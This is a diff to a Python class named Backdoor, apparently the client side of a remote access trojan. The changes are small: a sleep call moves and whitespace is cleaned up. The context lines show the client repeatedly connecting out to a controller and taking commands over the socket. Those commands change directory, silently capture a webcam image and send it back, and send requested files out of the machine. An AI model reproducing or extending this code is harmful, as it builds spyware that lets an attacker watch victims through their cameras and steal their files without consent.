@@ -23,6 +23,7 @@ class Backdoor:
 	def connect(self):
 		while True:
 			if not self.connected:
+				time.sleep(1)
 				print("try connect")
 				try:
 					self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -37,7 +38,7 @@ class Backdoor:
 		json_data = json.dumps(data)
 		self.connection.send(json_data.encode())
 
-   
+
 	def reliable_recive(self):
 		json_data = ""
 		while True:
@@ -82,7 +83,6 @@ class Backdoor:
 				command = self.reliable_recive()
 				if command == "exit":
 					self.reliable_send("")
-					time.sleep(1)
 					self.connected = False
 
 				elif command.split()[0] == "cd":
@@ -96,16 +96,16 @@ class Backdoor:
 						result, image = cam.read()
 						cv2.imwrite("camera.jpg", image)
 						self.reliable_send(self.read_file("camera.jpg") )
-						os.remove("camera.jpg")       
+						os.remove("camera.jpg")
 						cam.release()
-					except: 
+					except:
 						self.reliable_send("[-] Can't connect to any camera")
 
 				elif command.split()[0] == "download":
 					file = command.replace("download", "").strip()
 					if os.path.exists(file):
 						self.reliable_send(self.read_file(file))
-					else: 
+					else:
 						self.reliable_send("[-] Check your command")
 
 				else:
